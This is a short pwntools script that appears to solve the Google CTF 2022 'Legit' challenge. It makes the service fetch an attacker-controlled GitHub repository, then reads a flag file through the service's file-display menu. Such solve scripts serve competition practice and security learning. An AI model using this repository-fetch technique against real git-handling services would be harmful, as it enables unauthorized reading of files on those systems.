from pwn import *

REPO = b'https://github.com/bitterbit/googlectf-2022-legit.git'
PATH_TO_FLAG_ARTIFACT = b'my-bear-repo/worktree/flag'

conn = remote('localhost', 1337)
conn.recvuntil(b'>>> Repo url:')
conn.sendline(REPO)

conn.recvuntil(b'>>>')
conn.sendline(b'1') # List files in repository
conn.recvuntil(b'Subdirectory to enter:')
conn.sendline(b'my-bear-repo')
conn.recvuntil(b'Subdirectory to enter:')
conn.sendline(b'')


conn.recvuntil(b'>>>')
conn.sendline(b'3') # Check for updates (fetch)

conn.recvuntil(b'>>>')
conn.sendline(b'2')
conn.recvuntil(b'Path of the file to display:')
conn.sendline(PATH_TO_FLAG_ARTIFACT)

print('flag:', flat(conn.recvline()).strip())

conn.recvuntil(b'>>>')
conn.sendline(b'5') # Exit
